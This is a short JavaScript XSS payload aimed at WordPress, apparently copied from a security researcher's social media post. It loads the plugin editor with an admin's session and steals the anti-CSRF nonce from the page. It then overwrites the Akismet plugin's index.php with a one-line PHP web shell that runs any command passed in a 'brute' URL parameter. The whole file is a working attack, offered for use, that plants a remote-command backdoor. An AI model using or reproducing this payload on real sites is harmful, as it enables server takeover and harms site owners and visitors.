//Source: https://twitter.com/brutelogic

x=new XMLHttpRequest()
p='/wp-admin/plugin-editor.php?'
f='file=akismet/index.php'
x.open('GET',p+f,0)
x.send()
$='_wpnonce='+/ce" value="([^"]*?)"/.exec(x.responseText)[1]+'&newcontent=<?=`$_GET[brute]`;&action=update&'+f
x.open('POST',p+f,1)
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded')
x.send($)
